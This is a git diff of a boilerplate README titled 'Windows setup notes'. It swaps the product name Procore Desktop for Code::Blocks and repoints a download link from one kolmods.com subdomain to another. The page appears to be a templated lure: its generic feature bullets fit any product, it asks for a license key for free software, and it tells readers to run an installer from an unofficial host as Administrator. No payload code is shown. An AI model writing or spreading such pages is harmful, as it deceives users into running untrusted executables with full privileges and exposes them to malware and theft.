@@ -1,14 +1,10 @@
-# Procore Desktop Windows Setup Notes
+# Code::Blocks Windows Setup Notes
 
-<p align="center">
-  <a href="https://procore-2026.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Procore%20Desktop-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Procore Desktop">
-  </a>
-</p>
+**Download:** [Get Windows installer →](https://codeblocks-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Procore Desktop** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Code::Blocks** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Procore Desktop** from the Start menu
+5. Restart if the installer asks — then launch **Code::Blocks** from the Start menu
 
 ## What you can use it for
 
-- Core Procore Desktop features on Windows desktop
-- Install and configure Procore Desktop for daily use
-- Import, edit, and export with Procore Desktop tools
-- Tune settings and profiles inside Procore Desktop
-- Integrate Procore Desktop into your existing workflow
+- Core Code::Blocks features on Windows desktop
+- Install and configure Code::Blocks for daily use
+- Import, edit, and export with Code::Blocks tools
+- Tune settings and profiles inside Code::Blocks
+- Integrate Code::Blocks into your existing workflow
 
 ## License
 
